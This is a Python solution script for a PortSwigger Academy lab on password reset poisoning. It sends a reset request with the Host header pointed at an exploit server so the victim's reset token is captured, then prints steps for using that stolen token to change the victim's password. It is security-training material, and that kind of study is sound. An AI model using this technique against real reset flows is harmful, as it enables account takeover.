"""
Lab 1: Basic password reset poisoning
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
Difficulty: Apprentice

📝 The password-reset email's link is built from the Host header. Trigger
a reset for the victim with Host pointed at our exploit server — when they
click the (poisoned) link, their token lands in OUR exploit server's
access log instead of being used safely.
"""

from utils import get_session, request_with_host, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_SERVER_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"
VICTIM = "carlos"


def run():
    s = get_session()

    note(f"Requesting a password reset for {VICTIM}, with Host set to our")
    note("exploit server instead of the real domain.")

    r = request_with_host(
        s, "POST", f"{TARGET}/forgot-password",
        host_header=EXPLOIT_SERVER_HOST,
        data={"username": VICTIM},
    )
    log(f"Request status: {r.status_code}")

    note("If carlos 'clicks' the resulting email link (simulated by the lab")
    note("after a short delay), their reset token will arrive as a GET")
    note("request in the exploit server's ACCESS LOG — check that next:")
    note(f"  https://{EXPLOIT_SERVER_HOST}  (Go to exploit server > Access log)")

    note("Once you have the stolen token, use it against the REAL reset")
    note("endpoint (not the exploit server) to set carlos's password:")
    note(f"  POST {TARGET}/forgot-password?temp-forgot-password-token=STOLEN_TOKEN")
    note("  body: username=carlos&new-password-1=X&new-password-2=X")


if __name__ == "__main__":
    run()
